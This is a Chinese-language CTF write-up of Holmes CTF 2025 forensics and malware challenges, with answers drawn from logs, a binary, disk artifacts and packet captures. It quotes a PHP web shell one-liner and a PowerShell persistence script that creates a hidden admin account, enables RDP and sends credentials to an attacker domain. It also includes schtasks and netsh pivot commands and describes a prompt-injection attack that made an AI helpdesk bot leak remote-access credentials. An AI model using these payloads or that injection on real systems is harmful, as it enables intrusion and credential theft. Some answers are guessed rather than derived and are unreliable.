# Holmes CTF 2025 wp-先知社区

> **来源**: https://xz.aliyun.com/news/19019  
> **文章ID**: 19019

---

最近两天福尔摩斯ctf也是开了，玩了一下发现是取证和恶意软件，很有趣，于是写了篇wp用于总结和记录![](C:\Users\Admin\Desktop\SpMV5jYXVHMQCfs0f9Cacqty2vyikLdLHViyJPIe.jpg)  
![image.png](images/img_19019_001.png)

# The Card

Holmes receives a breadcrumb from Dr. Nicole Vale - fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.  
题目给了三个日志文件和三个网页，我们一个一个题目进行分析

## 题目1

```
Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot. (string)
```

题目1让我们去分析提供的日志，并确定攻击者针对 Nicole Vale 的蜜罐首次使用的 User-Agent 是什么  
打开给的access.log,日志中最早的请求记录为 **2025-05-01 08:23:12**，对应的 User-Agent 即为该值。  
第一行就是了  
![image.png](images/img_19019_002.png)  
因此第一题是：

```
Lilnunc/4A4D - SpecterEye
```

## 题目2

```
It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? (filename.ext)
```

题目要我们找到威胁行为者在绕过 WAF 后部署了一个 web shell的文件名  
日志（access.log)明确记录：**2025-05-15 11:25:12** 攻击者通过命令创建该 PHP Web Shell（`echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php`），且后续存在通过该文件执行命令的记录![](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20250924140740452.png)  
![image.png](images/img_19019_004.png)  
因此答案：

```
temp_4A4D.php
```

## 题目3

```
The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? (filename.ext)
```

该题让我们找威胁者窃取的数据库的名称  
同样在access.log，末尾就能发现  
![image.png](images/img_19019_005.png)  
因此答案：

```
database_dump_4A4D.sql
```

## 题目4

```
During the attack, a seemingly meaningless string seems to be recurring. Which one is it? (string)
```

在攻击过程中，一个看似无意义的字符串似乎在反复出现。是哪一个？  
![image.png](images/img_19019_006.png)

显而易见是4A4D  
该字符串在多个场景中重复出现，包括：User-Agent（`Lilnunc/4A4D`）、Web Shell 文件名（`temp_4A4D.php`）、数据库文件名（`database_dump_4A4D.sql`）、Beacon ID（`id=4A4D`）、工具标识（`4A4D RetrieveR/1.0.0`）等。

```
4A4D
```

## 题目5

```
OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.
```

OmniYard-3（前身为 Scotland Yard）已授予您访问其 CTI 平台的权限。浏览到第一个 IP:端口号地址，并统计有多少活动似乎与蜜罐攻击相关联。  
这个我们需要打开第一个端口网页，可以看到是个行为分析记录网站  
![image.png](images/img_19019_007.png)

筛选出蜜罐即可  
答案**:5**

## 题目6

```
How many tools and malware in total are linked to the previously identified campaigns? (number)
```

找到4a4d的攻击组织JM  
![image.png](images/img_19019_008.png)  
根据题目要求,细菌图标的是恶意软件，扳手是工具,找他俩的总和  
![image.png](images/img_19019_009.png)

故答案为：9

## 题目7

```
It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? (sha-256 hash)
```

看起来攻击者始终在他们活动中使用相同的恶意软件。它的 SHA-256 哈希值是什么？（sha-256 哈希值）  
![image.png](images/img_19019_010.png)

随便点一个jm节点的恶意软件，看他后面有个警告灯节点，点开就是sha256![](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20250924142539644.png)

答案：

```
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```

## 题目8

```
Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)
```

根据他给的账号密码登录第二个网页，把上一个题目的hash放进去搜索即可  
![image.png](images/img_19019_012.png)  
可以看到恶意ip是74.77.74.77  
答案：

```
74.77.74.77
```

## 题目9

```
What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)
```

题目要找恶意文件的完整路径

继续在第二个网页里面找，发现detail

![image.png](images/img_19019_013.png)

因此答案：

```
/opt/lilnunc/implant/4a4d_persistence.sh
```

## 题目10

```
Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?
```

问CogNet 扫描平台来发现 TA 的基础设施的其他详细信息。服务器有多少个开放的端口  
在第三个平台搜索前面的恶意ip  
就可以看到开放的端口  
![image.png](images/img_19019_014.png)

22 25 53 80 110 143 443 3389 7477 8080 8443   
一共11个端口  
故答案：11

## 题目11

```
Which organization does the previously identified IP belong to? (string)
```

依旧第三个端口的detail  
![image.png](images/img_19019_015.png)

答案：**SenseShield MSP**

## 题目12

```
One of the exposed services displays a banner containing a cryptic message. What is it? (string)
```

题目要一个暴露的服务显示了一个包含神秘信息的横幅。在刚才的开放端口处，找到了unknown端口，这个信息就是答案

![image.png](images/img_19019_016.png)

```
He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
```

# The Payload

## 题目1

```
During execution, the malware initializes the COM library on its main thread. Based on the imported functions, which DLL is responsible for providing this functionality? (filename.ext)
```

题目说执行过程中，恶意软件在其主线程上初始化 COM 库。根据导入的函数，哪个 DLL 负责提供此功能？

这个是常识  
 Windows 系统中负责提供 COM（组件对象模型）相关功能的核心 DLL是**ole32.dll**，包含CoInitialize 等初始化函数  
故答案：

```
ole32.dll
```

## 题目2

```
Which GUID is used by the binary to instantiate the object containing the data and code for execution? (********-****-****-****-************)
```

二进制文件使用哪个 GUID 来实例化包含执行数据和代码的对象？（**----\*\*\*\*\*\*\*\***）  
用ida打开附件反编译看看  
![image.png](images/img_19019_017.png)

可以看到伪代码里面就有**DABCD999-1234-4567-89AB-1234567890FF**  
代码第 39-45 行的`CoCreateInstance`调用中，第一个参数为`&GUID_dabcd999_1234_4567_89ab_1234567890ff`，该 GUID 是用于实例化 COM 对象的**类标识符（CLSID）**，即二进制文件创建目标对象时使用的 GUID。

```
DABCD999-1234-4567-89AB-1234567890FF
```

## 题目3

```
Which .NET framework feature is the attacker using to bridge calls between a managed .NET class and an unmanaged native binary? (string)
```

攻击者使用哪个.NET 框架功能在托管.NET 类和未管理的原生二进制之间桥接调用？（string）  
![image.png](images/img_19019_018.png)

代码中存在`IsClrLoaded()`检查，表明存在.NET CLR 交互逻辑。在.NET 中，**P/Invoke（Platform Invoke）** 是唯一用于在托管代码（.NET 类）中调用非托管原生二进制（如 Win32 API、C++ 编译的 DLL）的核心机制，符合 “桥接调用” 的描述。

因此答案为：**P/Invoke**

## 题目4

```
Which Opcode in the disassembly is responsible for calling the first function from the managed code? (** ** **)
```

题目要我们找反汇编中的哪个操作码负责调用托管代码中的第一个函数

在.NET IL（中间语言）反汇编中，托管代码的函数调用分为静态调用（`call`）和实例方法调用（`callvirt`）。由于托管类的方法通常为实例方法（需通过对象调用），且代码中存在 COM 对象（`obj.m_pInterface`）的实例方法调用逻辑（如`m_pInterface->Dummy`），对应的 IL 操作码为 **callvirt**（虚拟调用，处理多态与实例方法）。

故答案为**callvirt**

## 题目5

```
Identify the multiplication and addition constants used by the binary's key generation algorithm for decryption. (*, **h)
```

题目说要找密钥生成算法的乘法和加法常数  
![image.png](images/img_19019_019.png)

（非 AVX 优化分支）明确实现了密钥生成的核心逻辑：`target._Mypair._Myval2._Bx._Buf[n0x20] = 7 * n0x20 + 66`其中：

* 乘法常数为 `7`（整数）；
* 加法常数为 `66`（十进制），转换为十六进制为 `0x42h`。

## 题目6

```
Which Opcode in the disassembly is responsible for calling the decryption logic from the managed code? (** ** **)
```

题目问操作码  
去ida里面找汇编  
看text字段  
![image.png](images/img_19019_020.png)

结合汇编指令格式和，需去除指令中可变的偏移量占位符（XX XX），保留固定且符合长度的操作码部分。

从`ScanAndSpread`函数中执行有效载荷的核心指令（`call qword ptr [rax+60h]`）来看，x86-64 架构中 “寄存器相对寻址的间接调用” 操作码为 `FF 50 60`：

* `FF` 是间接调用的基础操作码，`50 60` 对应 “对 `rax` 寄存器加 `60h` 偏移量寻址” 的编码，三者组合为固定 6 字符（含空格分隔），且直接对应有效载荷入口的调用行为。

**最终答案：FF 50 60**

## 题目7

```
Which Win32 API is being utilized by the binary to resolve the killswitch domain name? (string)
```

题目要求解析 killswitch 域名的 Win32 API  
![image.png](images/img_19019_021.png)

代码明确调用了`getaddrinfo((PCSTR)decryptedResult_1, 0LL, ...)`，其中`decryptedResult_1`是解密得到的 killswitch 域名。`getaddrinfo`是 Win32 标准 API，用于将域名解析为 IP 地址，完全匹配 “解析 killswitch 域名” 的功能描述（替代旧版`DnsQuery_A`，是现代 Windows 的首选域名解析 API）。

故答案：**getaddrinfo**

## 题目8

```
Which network-related API does the binary use to gather details about each shared resource on a server? (string)
```

![image.png](images/img_19019_022.png)

代码调用了`ScanAndSpread(&target, pSrc)`，结合上下文 “SMB propagation”（SMB 传播，第 211 行），可知该函数用于扫描局域网内的 SMB 共享资源。在 Win32 API 中，**NetShareEnum** 是专门用于枚举服务器（或远程主机）上所有共享资源的网络 API，返回共享名、类型、权限等详细信息，是恶意软件 SMB 传播的核心依赖 API。

故本题答案为：**NetShareEnum**

## 题目9

```
Which Opcode is responsible for running the encrypted payload? (** ** **)
```

在地址 `00000001400023E4` 处：

text

```
.text:00000001400023E4 call    ?ScanAndSpread@@YAXAEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAD@Z ; ScanAndSpread(std::string &,char *)
```

这个函数 `ScanAndSpread` 很可能包含执行加密 payload 的逻辑。但是题目问的是**操作码**，所以我们需要进入 `ScanAndSpread` 函数内部，找到实际执行 shellcode 的指令。

在 `ScanAndSpread` 函数中查找

1. 在 IDA 中双击 `ScanAndSpread` 函数进入该函数。
2. 在函数内部搜索以下指令：

* `call rax` → 机器码 **FF D0**
* `jmp rax` → 机器码 **FF E0**
* `call qword ptr [rax]` → 机器码 **FF 10**

这些指令通常用于执行解密后的 shellcode。故答案：**FF D0**

## 题目10

```
Find → Block → Flag: Identify the killswitch domain, spawn the Docker to block it, and claim the flag. (HTB{*******_**********_********_*****})
```

因为是killswitch域名  
函数加密逻辑就是xor和base64  
写个脚本爆破xor密钥

```
import base64

def generate_xor_key(key_length: int = 32) -> bytes:
    """生成代码中定义的32字节XOR密钥（7*n + 66，n从0到31），确保在0-255范围内"""
    key = []
    for n in range(key_length):
        # 计算密钥字节并确保在0-255范围内
        key_byte = (7 * n + 66) % 256  # 添加取模操作，确保不超出范围
        key.append(key_byte)
    return bytes(key)

def decrypt_killswitch(encrypted_b64: str, xor_key: bytes) -> str:
    """
    解密killswitch域名：
    1. Base64解码加密字符串
    2. 用XOR密钥逐字节异或解密（密钥循环使用）
    """
    # 1. Base64解码（处理URL安全字符，兼容代码中的编码格式）
    try:
        encrypted_data = base64.b64decode(encrypted_b64, validate=True)
        print(f"Base64解码后的密文（十六进制）: {encrypted_data.hex()}")
    except Exception as e:
        print(f"Base64解码失败: {e}")
        return ""
    
    # 2. XOR逐字节解密（密钥循环使用，适配密文长度）
    decrypted_bytes = []
    for i in range(len(encrypted_data)):
        # 密文字节 ^ 对应位置的密钥字节（i % len(xor_key)实现密钥循环）
        decrypted_byte = encrypted_data[i] ^ xor_key[i % len(xor_key)]
        decrypted_bytes.append(decrypted_byte)
    
    # 转换为字符串（过滤不可见字符，确保域名格式正确）
    try:
        decrypted_domain = bytes(decrypted_bytes).decode("ascii", errors="ignore").strip()
        return decrypted_domain
    except Exception as e:
        print(f"转换为字符串失败: {e}")
        return ""

if __name__ == "__main__":
    # 代码中提取的Base64加密字符串（killswitch域名的加密形式）
    ENCRYPTED_B64 = "KXgmYHMADxsV8uHiuPPB3w=="
    # 生成32字节XOR密钥
    XOR_KEY = generate_xor_key()
    print(f"生成的XOR密钥（ASCII）: {XOR_KEY.decode('ascii', errors='replace')}")
    print(f"生成的XOR密钥（十六进制）: {XOR_KEY.hex()}")
    
    # 执行解密
    killswitch_domain = decrypt_killswitch(ENCRYPTED_B64, XOR_KEY)
    print("
" + "="*50)
    print(f"解密得到的killswitch域名: {killswitch_domain}")
    print("="*50)
```

```
生成的XOR密钥（ASCII）: BIPW^elsz
成的XOR密钥（十六进制）: 424950575e656c737a81888f969da4abb2b9c0c7ced5dce3eaf1f8ff060d141b
Base64解码后的密文（十六进制）: 2978266073000f1b15f2e1e2b8f3c1df

==================================================
解密得到的killswitch域名: k1v7-echosim.net
==================================================
```

![image.png](images/img_19019_023.png)

故：**HTB{Eternal\_Companions\_Reunited\_Again}**

# The Tunnel Without Walls

题目给了个mem文件，根据后面问题描述，大概率是Linux内核取证

## 题目1

```
What is the Linux kernel version of the provided image? (string)
```

问内核版本，直接使用vol去提取

```
vol.exe -f E:\memdump.mem linux.vmcoreinfo.VMCoreInfo
```

![image.png](images/img_19019_024.png)

故答案为：**5.10.0-35-amd64**

# The Enduring Echo

LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.

## 题目1

```
What was the first (non cd) command executed by the attacker on the host? (string)
```

题目给了三个日志文件和一个C盘文件夹，在C\Windows\System32\winevt\logs发现Windows日志  
对Security.evtx进行分析,分析日志得到攻击者是werni

![image.png](images/img_19019_025.png)

第一条非cd的命令是**systeminfo**  
另外在The\_Enduring\_Echo\C\Users\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost\_history.txtyy验证了答案  
![image.png](images/img_19019_026.png)

## 题目2

```
Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
```

在上一个题目的下面就是答案

![image.png](images/img_19019_027.png)

```
C:\Windows\System32\wbem\WmiPrvSE.exe
```

## 题目3

```
Which remote-execution tool was most likely used for the attack? (filename.ext)
```

在攻击溯源场景中，`wmiexec.py` 是一个典型的远程执行工具，常用于通过 WMI（Windows 管理规范）在远程 Windows 系统上执行命令，尤其在横向移动中频繁出现。

它的核心特点包括：

* 基于 WMI 协议，无需在目标机上安装额外服务
* 可通过明文或哈希传递（Pass-the-Hash）进行认证
* 能在远程系统上执行命令、上传文件或获取交互 Shell

结合此前分析的日志场景（如 `Werni` 账户创建、远程登录记录），攻击者可能使用 `wmiexec.py` 执行如下操作：

```
python wmiexec.py Administrator@192.168.1.100 "net user Werni Quantum1! /add"
```

这类操作会在目标机的 `Security.evtx` 中留下 4688（进程创建）、4624（登录成功）等事件，且常伴随 `wmiprvse.exe` 进程的活动记录，这也是后续日志分析中可关注的特征。

故答案：**wmiexec.py**

## 题目4

```
What was the attacker’s IP address? (IPv4 address)
```

![image.png](images/img_19019_028.png)

可以发现除了本机ip只有这个恶意ip  
故答案为：**10.129.242.110**

## 题目5

```
What is the first element in the attacker's sequence of persistence mechanisms? (string)
```

在日志里发现  
![image.png](images/img_19019_029.png)

```
schtasks  /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 
```

故答案为：SysHelper Update

## 题目6

我们在The\_Enduring\_Echo\C\Users\Werni\AppData\Local发现了JM.ps1的powershell恶意脚本

```
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}

```

根据日志结合分析，这个就是识别持久机制执行的脚本  
故答案：**C\Users\Werni\AppData\Local\JM.ps1**

## 题目7

```
What local account did the attacker create? (string)
```

根据上面的powershell  
![image.png](images/img_19019_030.png)

脚本创建了许多用户：  
svc\_netupd", "svc\_dns", "sys\_helper", "WinTelemetry", "UpdaterSvc"  
接着去分析日志  
![image.png](images/img_19019_031.png)

发现只有svc\_netupd被使用  
故答案：**svc\_netupd**

## 题目8

```
What domain name did the attacker use for credential exfiltration? (domain)
```

同样是powershell脚本  
![image.png](images/img_19019_032.png)

故答案：**NapoleonsBlackPearl.htb**

## 题目9

```
What password did the attacker's script generate for the newly created user? (string)
```

题目让我们找密码  
刚刚的powershell给了密码生成原理  
![image.png](images/img_19019_033.png)  
Watson\_时间戳  
这个时间戳没找到具体的，进行了掩码爆破  
得到答案：**Watson\_20250824160509**

## 题目10

```
What was the IP address of the internal system the attacker pivoted to? (IPv4 address)
```

攻击者转向的内部系统的 IP 地址是什么？（IPv4 地址）  
分析2025-08-25T20\_20\_59\_5246365\_CopyLog.csv和2025-08-25T20\_20\_59\_5246365\_SkipLog.csv.csv  
在他俩的首行就有答案  
![image.png](images/img_19019_034.png)

![image.png](images/img_19019_035.png)

`C:\Users\Werni\.ssh\known_hosts` → SSH 连接历史

故这个答案在The\_Enduring\_Echo\C\Users\Administratorssh下的known\_hosts

找到后打开：

```
192.168.1.101 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjmtTU4ZUCw5B2ShEblTYP+LPsaSWZcEndPl1fcZVOjEm1lkYpO9AmafttpZNM0xmG9K0gp9xcKFTcS7Xz89x4=
```

**192.168.1.101**  
 → 目标主机的 **IP 地址**（内网机器）。

> 这应该就是攻击者在持久化后横向移动 / pivot 的内部目标系统。

**ecdsa-sha2-nistp256**  
 → 主机公钥算法类型（ECDSA，曲线 P-256）。

**AAAAE2Vj...7Xz89x4=**  
 → 这是 base64 编码的主机公钥。  
故答案为：

```
192.168.1.101
```

## 题目11

```
Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)
```

受害者的哪个 TCP 端口被转发以启用转向？（端口 0-65565）  
这个我们回到security.evtx日志，过滤netsh就能查看到端口

**pivot 目标（connectaddress:connectport）**： `192.168.1.101:22`（也就是把受害者的 0.0.0.0:9999 转到内网 192.168.1.101 的 22 端口）。这说明 `netsh interface portproxy` 被用来做端口转发 / 内部代理（pivot）

![image.png](images/img_19019_036.png)

故答案为**9999**

## 题目12

```
What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)
```

存储持久 IPv4→IPv4 TCP 监听器到目标映射的完整注册表路径是什么？（HKLM....）  
这个题目是常识  
netsh interface portproxy add v4tov4 `会在事件或 PowerShell 命令历史里留下` listenaddress/listenport/connectaddress/connectport`，或持久化到注册表` HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 cp

```
HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```

## 题目13

```
与攻击者先前用于横向移动到内部系统的技术相关联的 MITRE ATT&CK ID 是什么？（Txxxx.xxx）
```

因为 netsh interface portproxy add v4tov4 ... connectaddress=192.168.1.101 connectport=22 是在受感染主机上把外部连接转发到内部主机（把受害机当作代理/跳板），这正是 MITRE 所定义的 内部代理（Internal Proxy） 行为 —— 即把流量在被入侵的内部系统间转发以隐藏真实目标并实现横向/命令与控制通信

MITRE 的定义：**Internal Proxy (T1090.001)** 指“对被入侵环境内两台或多台系统之间的 C2/流量做内部代理/转发以隐藏真实目的地或减少外部连接数”等。你看到的 portproxy 就属于“把流量从本机端口转发到内网主机”的典型例子

实际命令行完全吻合该行为：`listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22` —— 这是在本机监听 9999 并把连接转发到内网 `192.168.1.101:22`，等同于把受害机作为内部代理/跳板。<https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a?utm_source=chatgpt.com>)

官方与社区检测建议也把 `netsh portproxy` 视为常见的“内部代理 / 端口转发”手段（Velociraptor、CISA、各检测博客均以 `netsh` / PortProxy 为示例）。这进一步支持把该行为映射到 T1090.001。

故答案为: **T1090.001**

## 题目14

```
Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)
```

题目问在攻击之前，管理员配置 Windows 以在事件日志中捕获命令行详细信息。他们运行了什么命令来实现这一点  
故在管理员下面找(The\_Enduring\_Echo\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline)  
发现powershell历史命令

```
ipconfig
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 172.18.6.3 -PrefixLength 24
ipconfig.exe
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.129.233.246 -PrefixLength 24
ipconfig
ncpa.cpl
ipconfig
ping 1.1.1.1
cd C:\Users\
ls
net user Werni Quantum1! /add
ls
net localgroup administrator Werni /add
net localgroup Administrators Werni /add
clear
wmic computersystem where name="%COMPUTERNAME%" call rename name="Heisen-9-WS-6"
ls
cd ..
ls
cd .\Users\
ls
net users
Rename-Conputer -NewName "Heisen-9-WS-6" -Force
Rename-Computer -NewName "Heisen-9-WS-6" -Force
net users
ls
net user felamos /delete
cd ..
ls
net users
cat .\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"
Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled
```

管理员配置 Windows 在事件日志中捕获命令行详细信息所运行的命令是：`auditpol /set /subcategory:"Process Creation" /success:enable` 和 `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f`  
而正确答案是：**reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine\_Enabled /t REG\_DWORD /d 1 /f**

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

# The Watchman's Residue

With help from D.I. Lestrade, Holmes acquires logs from a compromised MSP connected to the city’s financial core. The MSP’s AI servicedesk bot looks to have been manipulated into leaking remote access keys - an old trick of Moriarty’s.  
附件给了msp-helpdesk-ai day 5982 section 5 traffic.pcapng，acquired file (critical).kdbx和TRIAGE\_IMAGE\_COGWORK-CENTRAL文件夹

## 题目1

```
What was the IP address of the decommissioned machine used by the attacker to start a chat session with MSP-HELPDESK-AI? (IPv4 address)
```

攻击者用来与 MSP-HELPDESK-AI 开始聊天会话的已退役机器的 IP 地址是什么？（IPv4 地址）

打开流量包，搜索password  
![image.png](images/img_19019_037.png)

发现有字符串，ip是10.0.69.45 ，追踪流发现确实是这个ip在进行prompt攻击  
![image.png](images/img_19019_038.png)

故答案:**10.0.69.45**

## 题目2

```
What was the first message the attacker sent to the AI chatbot? (string)
```

攻击者向 AI 聊天机器人发送的第一条消息是什么?  
找到攻击者ip出现的第一次即可  
![image.png](images/img_19019_039.png)  
答案：**Hello Old Friend**

## 题目3

```
When did the attacker's prompt injection attack make MSP-HELPDESK-AI leak remote management tool info? (YYYY-MM-DD HH:MM:SS)
```

攻击者的提示注入攻击何时使 MSP-HELPDESK-AI 泄露远程管理工具信息？（YYYY-MM-DD HH:MM:SS）  
![image.png](images/img_19019_040.png)

![](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20250925173657000.png)HTTP 交互日志显示，攻击者于**2025-08-19 12:02:06**通过`POST /api/messages/send`发送提示注入命令（对应此前已知的 “提示注入泄露 RMM 信息时间”），同时`TeamViewer15_Logfile.txt`记录该时间点出现`WinCryptoProtectData::DecryptData`（凭证解密）操作（“2025/08/19 12:02:06.384 5064 1548 G1 WinCryptoProtectData::DecryptData has successfully decrypted!”），证明凭证转储工具（如 Mimikatz)在此时执行，与提示注入泄露 RMM 信息同步。

答案： **2025-08-19 12:02:06**

## 题目4

```
What is the Remote management tool Device ID and password? (IDwithoutspace:Password)
```

远程管理工具的设备 ID 和密码是什么？

在第一问就找到了  
![image.png](images/img_19019_042.png)

![](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20250925173802359.png)答案：**565963039:CogWork\_Central\_97&65**

## 题目5

```
What was the last message the attacker sent to MSP-HELPDESK-AI? (string)
```

攻击者最后向 MSP-HELPDESK-AI 发送了什么消息？(字符串)

过滤一下恶意ip的流量包  
![image.png](images/img_19019_044.png)  
追踪一下找到最后攻击者发的信息  
![image.png](images/img_19019_045.png)  
答案：**JM WILL BE BACK**

## 题目6

```
When did the attacker remotely access Cogwork Central Workstation? (YYYY-MM-DD HH:MM:SS)
```

攻击者何时远程访问了 Cogwork 中央工作站？(YYYY-MM-DD HH:MM:SS)  
这个题目我们在C\Program Files\TeamViewer\Connections\_incoming.log发现答案

`TeamViewer\Connections_incoming.log` 是 **TeamViewer 远程控制软件**生成的核心日志文件之一，专门记录设备接收的**所有远程连接请求与成功建立的连接详情**  
![image.png](images/img_19019_046.png)  
可以发现答案：**2025-08-20 09:58:25**

## 题目7

```
What was the RMM Account name used by the attacker? (string)
```

攻击者使用了什么 RMM 账户名?  
依旧去看上一个的日志  
![image.png](images/img_19019_047.png)  
答案：**James Moriarty**

## 题目8

```
What was the machine's internal IP address from which the attacker connected? (IPv4 address)
```

攻击者从哪个内部 IP 地址连接到这台机器？（IPv4 地址）  
![image.png](images/img_19019_048.png)

日志 `2025/08/20 10:58:36.813` 记录 UDP 穿透信息：`UDPv4: punch received a=192.168.69.213:55408`，其中 `192.168.69.213` 为攻击者发起连接的内部 IP（192.168.x.x 属于私有 IPv4 网段，符合 “内部 IP” 定义）。

故答案：**192.168.69.213**

## 题目9

```
When did the malicious RMM session end? (YYYY-MM-DD HH:MM:SS)
```

恶意 RMM 会话是什么时候结束的？

![image.png](images/img_19019_049.png)

会话表中 `James Moriarty` 的恶意会话结束时间明确为 **2025-08-20 10:14:27**，与最新日志 `2025/08/20 11:14:27` 记录的 “会话终止、参与者移除” 流程一致（时间差为时区差异，日志为 UTC+1，会话表可能为 UTC 或本地时区修正后），确认此为恶意会话的准确结束时间![](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20250925175022044.png)  
![image.png](images/img_19019_051.png)

## 题目10

```
The attacker found a password from exfiltrated files, allowing him to move laterally further into CogWork-1 infrastructure. What are the credentials for Heisen-9-WS-6? (user:password)
```

攻击者从被窃取的文件中找到了一个密码，使他能够进一步横向移动到 CogWork-1 基础设施。Heisen-9-WS-6 的凭证是什么?

这种猜测在数据库里面，题目给的一个kdbx文件，爆破kdbx文件密码，keepass打开就行  
hashcat爆破  
![image.png](images/img_19019_052.png)

得到密码**cutiepie14**

打开就能发现账号密码  
![image.png](images/img_19019_053.png)  
故答案为：**Werni:Quantum1!**
